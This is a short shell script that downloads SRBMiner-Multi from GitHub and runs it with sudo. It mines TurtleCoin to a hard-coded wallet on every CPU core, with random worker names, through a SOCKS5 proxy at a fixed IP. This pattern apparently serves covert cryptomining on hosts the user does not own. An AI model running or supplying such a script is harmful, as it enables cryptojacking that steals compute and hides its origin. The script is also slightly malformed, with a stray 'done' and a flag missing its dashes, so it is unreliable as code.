#!/bin/sh
apt-get update -y
apt-get install -y libjansson-dev 
apt install screen -y screen 
worker=$(echo $(shuf -i 1000-9999 -n 1)-ngung)
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-7-1-Linux.tar.xz && cd SRBMiner-Multi-0-7-1 && sudo ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool us.turtlecoin.herominers.com:10381 --wallet TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.$worker -t $(nproc --all) --password x enable-4gb-hugepages --proxy socks5://98.175.31.195:4145
done
exit
